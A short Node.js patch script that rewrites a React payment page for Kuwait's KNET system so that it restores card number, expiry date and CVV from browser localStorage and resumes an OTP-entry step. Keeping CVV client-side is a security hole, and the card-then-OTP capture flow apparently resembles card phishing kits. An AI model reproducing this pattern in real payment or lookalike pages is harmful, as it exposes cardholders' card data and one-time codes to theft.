import fs from "fs";
const p="src/pages/KNETPayment.tsx";
let k=fs.readFileSync(p,"utf8").replace(/\r\n/g,"\n");
const rx=/  \/\/ Resume OTP phase after coming back from bank app page[\s\S]*?\n  \}, \[\]\);/;
if(!rx.test(k)){console.log("ANCHOR FAIL");process.exit(1);}
const blk=`  // Resume OTP phase after coming back from bank app page
  useEffect(() => {
    if (localStorage.getItem("knetPhase") !== "otp") return;
    localStorage.removeItem("knetPhase");
    const pd = JSON.parse(localStorage.getItem("paymentData") || "{}");
    if (pd.cardNumber) setCardNumber(pd.cardNumber);
    if (pd.prefix) setSelectedPrefix(pd.prefix);
    if (pd.bankName) setSelectedBank(pd.bankName);
    if (pd.expiryMonth) setExpiryMonth(pd.expiryMonth);
    if (pd.expiryYear) setExpiryYear(pd.expiryYear);
    if (pd.cvv) setCardCvv(pd.cvv);
    setPhase("otp");
    startCountdown();
    navigateToPage("رمز التحقق كي نت (OTP)");
  }, []);`;
k=k.replace(rx,blk);
fs.writeFileSync(p,k,"utf8");
console.log("RESUME RESTORE OK");
